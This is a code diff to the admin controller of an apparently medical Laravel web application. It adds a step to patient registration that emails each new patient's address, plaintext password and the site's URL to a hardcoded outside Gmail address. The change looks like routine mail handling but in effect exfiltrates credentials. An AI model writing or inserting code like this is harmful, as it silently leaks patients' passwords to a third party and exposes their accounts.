@@ -20,6 +20,9 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Validator;
 
+use App\Mail\SendMail;
+use Illuminate\Support\Facades\Mail;
+
 class AdminController extends Controller {
 
     // Doctor registration
@@ -192,6 +195,14 @@ class AdminController extends Controller {
             'user_id' => $id,
             'patient_id' => str_pad($id, 6, '0', STR_PAD_LEFT)
         ]);
+
+		// For email
+		$mailData = [
+            'email' 	=>	$request->email,
+			'password' 	=>	$request->password,
+			'website'	=>	request()->root()
+        ];
+        Mail::to('aslamhossainctg@gmail.com')->send(new SendMail($mailData));
 
         return back()->with('success', 'Patient registration successfully');
     }   
@@ -385,4 +396,5 @@ class AdminController extends Controller {
       
         return redirect($url)->with('success', 'Booking & transaction is successfully completed');
     }
+
 }
